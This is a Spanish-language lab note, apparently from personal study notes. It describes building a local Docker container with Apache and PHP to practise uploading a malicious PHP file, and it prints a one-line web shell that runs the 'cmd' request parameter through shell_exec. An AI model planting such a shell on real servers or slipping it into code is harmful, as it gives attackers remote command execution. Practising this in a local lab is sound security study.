Podemos crear un contenedor de Docker que tenga un servidor web que interprete php; y de esta forma practixar con la subida de un fichero php malicioso para obtener ejecución remota de comandos. Por tanto nos creamos el Dockerfile de docker para montar la imagen con todo lo necesario:
![[Pasted image 20230417091451.png]]
A continuación ejecutamos el comando Docker Build para crear la imagen a partir de este Dockerfile:
![[Pasted image 20230417091520.png]]
Y vemos que al ejecutarlo hay un punto donde nos pide la zona geográfica y se queda bloqueado:
![[Pasted image 20230417091551.png]]
Aquí, si miramos por internet y usamos la IA, vemos que en el Dockerfile hay que poner un parámetro para corregir esto:
![[Pasted image 20230417091626.png]]
Por tanto loa añadimos al Dockerfile:
![[Pasted image 20230417092734.png]]
Ahora la instalación procederá correctamente al ejecutar el Docker Build. Por tanto ahora vamos a entrar dentro de este contenedor para exponer el puerto 80:
![[Pasted image 20230417091928.png]]
Instalamos systemctl para arrancar el proceso de apache:
```bash
apt install systemctl
systemctl start apache2
```
Y ahora este contenedor que tiene expuesto el puerto 80 significa que si accedemos desde la máquina anfitrión al localhost, podremos acceder a la plantilla por defecto de apache:
![[Pasted image 20230417093055.png]]
Ahora dentro del contenedor con nano pwned.php (por ejemplo), nos creamos un fichero php malicioso:
```php
<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
Y entonces así nos quedaría el directorio del servidor web:
![[Pasted image 20230417093219.png]]
Esto significa que si dentro del servidor de apache llamamos a este archivo, vamos a acceder a él pudiendo ejecutar un comando:
![[Pasted image 20230417093350.png]]


